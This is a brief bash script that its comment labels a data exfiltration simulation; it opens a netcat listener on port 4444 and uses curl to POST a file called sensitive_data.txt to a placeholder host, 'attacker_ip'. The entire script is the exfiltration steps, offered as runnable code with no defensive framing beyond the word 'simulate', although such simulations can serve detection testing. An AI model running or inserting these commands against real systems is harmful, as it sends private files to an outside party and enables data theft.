#!/bin/bash

# Simulate data exfiltration using netcat
nc -lvp 4444 > exfiltrated_data.txt &
curl -X POST -d @sensitive_data.txt http://attacker_ip/exfiltrate
echo "Exfiltration attack simulation executed"
